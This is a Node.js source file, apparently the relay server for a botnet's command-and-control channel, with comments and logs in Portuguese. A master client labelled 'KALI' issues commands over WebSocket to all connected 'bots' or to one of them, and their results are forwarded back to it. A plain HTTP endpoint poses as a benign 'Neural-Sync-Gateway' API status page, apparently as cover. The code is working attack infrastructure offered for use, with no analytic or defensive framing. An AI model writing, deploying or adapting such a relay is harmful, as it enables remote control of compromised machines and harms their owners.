const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: "running", api: "v2.0.4", service: "Neural-Sync-Gateway" }));
});

const wss = new WebSocket.Server({ server });
let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        if (KALI) KALI.terminate();
        KALI = ws;
        console.log('[+] Orquestrador Master Conectado');
        BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
    } else if (id) {
        BOTS.set(id, ws);
        console.log(`[+] Novo Nó de Processamento: ${id}`);
        if (KALI && KALI.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
    }

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (ws === KALI) {
                // Se to for 'ALL', envia para todos os nós
                if (data.to === 'ALL') {
                    BOTS.forEach(client => client.send(JSON.stringify(data.cmd)));
                } else {
                    const target = BOTS.get(data.to);
                    if (target) target.send(JSON.stringify(data.cmd));
                }
            } else if (KALI && KALI.readyState === WebSocket.OPEN) {
                // Retorno do Bot para o Kali (Resultados do processamento)
                KALI.send(JSON.stringify({ t: 'res', f: id, d: data }));
            }
        } catch (e) {
            if (ws !== KALI && KALI) KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
        }
    });

    const timer = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
        else clearInterval(timer);
    }, 20000);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Shadow Relay v2.0 ativo na porta ${PORT}`));
